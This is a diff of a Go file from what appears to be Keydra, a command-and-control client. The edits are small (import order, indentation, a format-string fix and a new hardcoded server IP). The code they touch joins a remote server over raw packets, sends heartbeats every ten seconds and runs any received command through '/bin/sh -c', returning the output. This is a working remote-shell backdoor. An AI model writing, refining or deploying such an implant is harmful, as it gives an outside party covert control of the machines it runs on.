@@ -8,8 +8,8 @@ import (
 	"strings"
 	"time"
 
-	"github.com/google/gopacket"
 	"github.com/DaveTheBearMan/Keydra/socket"
+	"github.com/google/gopacket"
 	"golang.org/x/sys/unix"
 )
 
@@ -21,10 +21,10 @@ var DestinationPort = 5542
 
 // Send command
 func sendMessageToServer(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.HardwareAddr, clientMessage string) {
-    fd := socket.NewSocket()
+	fd := socket.NewSocket()
 	defer unix.Close(fd)
 
-    addr := socket.CreateAddrStruct(iface)
+	addr := socket.CreateAddrStruct(iface)
 
 	packet := socket.CreatePacket(iface, src, dst, 18000, DestinationPort, dstMAC, clientMessage)
 	socket.SendPacket(fd, iface, addr, packet)
@@ -39,7 +39,7 @@ func connectToServer(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Ha
 	fmt.Println("[+] Sent Join")
 
 	// Send heartbeat every ten seconds
-    go func() {
+	go func() {
 		time.Sleep(1 * time.Second)
 		for {
 			sendMessageToServer(iface, src, dst, dstMAC, socket.GenerateClientHeartbeat(iface.HardwareAddr, src))
@@ -86,7 +86,7 @@ func execCommand(command string) (response string) {
 		output, err := exec.Command("/bin/sh", "-c", command).CombinedOutput()
 		if err != nil {
 			fmt.Println("\n[-] ERROR:", err)
-			return fmt.Sprintf("\nERROR:", err)
+			return fmt.Sprintf("\nERROR: %s", err)
 		}
 		// Save last command we just ran
 		lastCmdRan = command
@@ -117,7 +117,7 @@ func main() {
 	}
 
 	// Create response socket
-	dst := net.IPv4(157, 245, 141, 117)
+	dst := net.IPv4(129, 21, 21, 67)
 	connectToServer(iface, src, dst, dstMAC)
 
 	// Listen for commands
